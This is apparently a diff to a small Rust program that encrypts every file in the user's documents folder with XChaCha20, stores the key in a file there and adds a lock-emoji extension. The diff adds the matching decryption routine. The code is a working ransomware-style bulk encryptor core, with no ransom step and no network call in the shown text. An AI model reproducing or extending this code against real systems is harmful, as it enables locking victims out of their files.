@@ -1,4 +1,3 @@
-use std::io::Write;
 use std::{fs, path::Path};
 use std::path::PathBuf;
 use orion::aead::{self, SecretKey};
@@ -14,8 +13,11 @@ type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;
 fn main() -> IDFC<()> {
 	let target_dir = document_dir().unwrap();
 	let mut keyfile_loc = target_dir.clone();
+
 	keyfile_loc.push(KEY_FILE_NAME);
 	let keyfile_loc = keyfile_loc; // make immutable
+
+	fs::File::create(&keyfile_loc)?;
 	let canonical_keyfile_path = keyfile_loc.canonicalize()?;
 
 	let mode_choice: String = read!();
@@ -27,7 +29,7 @@ fn main() -> IDFC<()> {
 
 	if encrypting {
 		let key = SecretKey::default();
-		append_file(keyfile_loc, key.unprotected_as_bytes())?;
+		fs::write(keyfile_loc, key.unprotected_as_bytes())?;
 
 		// encrypt shit :P
 		for entry in entries {
@@ -41,11 +43,17 @@ fn main() -> IDFC<()> {
 			}
 		}
 	} else {
-		todo!()
-		//let key = read_keyfile()?;
-		//let key_bytes = k.unprotected_as_bytes();
+		let key = read_keyfile(&keyfile_loc)?;
 
-		//decrypt_file(path, keyfile_loc.as_path())?;
+		// decrypt shit uwu
+		for entry in entries {
+			let entry = entry?;
+			let path = entry.path();
+	
+			if path.is_file() {
+				decrypt_file(path, &key)?;
+			}
+		}
 	};
 
 	Ok(())
@@ -76,30 +84,48 @@ fn encrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
 	Ok(())
 }
 
-fn decrypt_file(path: &Path, keyfile_loc: &Path) -> IDFC<()> {
-	todo!()
-}
+fn decrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
+	let file_name = path.file_name().unwrap().to_string_lossy();
 
-fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
-	let ciphertext = aead::seal(&key, src)?;
-	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
+	// Don't decrypt non-encrypted files
+	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
+		return Ok(())
+	}
 
-	Ok(ciphertext)
-}
+	// remove .🔒 from file extension
+	let mut decrypted_path = path.to_string_lossy().to_string();
+	decrypted_path.truncate(decrypted_path.len() - ENCRYPTED_EXTENSION.len());
+	let decrypted_path = decrypted_path;
 
-fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> IDFC<()> {
-	fs::write(&path, &[])?;
+	// Prepare new file data
+	let content = fs::read(&path)?;
+	let plaintext = decrypt_xchacha20(&content[..], &key)?;
 
-	let mut file = fs::OpenOptions::new()
-		.append(true)
-		.create(true)
-		.open(&path)?;
+	// Write encrypted data to new file
+	fs::write(&decrypted_path, &plaintext[..])?;
 
-	file.write(data)?;
+	// rm old file
+	fs::remove_file(&path)?;
 
 	Ok(())
 }
 
-fn read_keyfile() -> IDFC<SecretKey> {
-	todo!()
+fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
+	let ciphertext = aead::seal(&key, src)?;
+
+	Ok(ciphertext)
+}
+
+fn decrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
+	let decrypted = aead::open(
+		&key,
+		src
+	)?;
+
+	Ok(decrypted)
+}
+
+fn read_keyfile(keyfile: &Path) -> IDFC<SecretKey> {
+	let keyfile_data = fs::read(&keyfile)?;
+	Ok(SecretKey::from_slice(&keyfile_data[..])?)
 }
